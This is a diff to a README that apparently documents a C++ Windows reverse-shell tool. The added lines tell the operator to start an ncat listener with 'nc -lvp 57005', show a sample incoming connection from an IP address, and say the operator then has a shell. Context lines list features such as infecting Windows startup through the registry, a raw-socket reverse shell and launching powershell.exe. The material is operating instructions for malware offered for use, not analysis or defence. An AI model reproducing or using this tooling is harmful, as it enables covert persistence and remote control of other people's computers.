@@ -15,6 +15,17 @@ Here is the initialize shell code
     RunShell(host, port);
 ```
 
+# Access
+You can access the shell by opening a port and hosting a ncat server
+```cpp
+nc -lvp 57005
+```
+Then it should say
+```yml
+Ncat: Connection from 46.165.252.184
+```
+Then press enter and you got a shell
+
 # Features
 Infect Windows Startup with registry
 Reverse Shell via raw sockets
@@ -27,3 +38,4 @@ to for example powershell
 ```cpp
 char Process[15] = "powershell.exe";
 ```
+
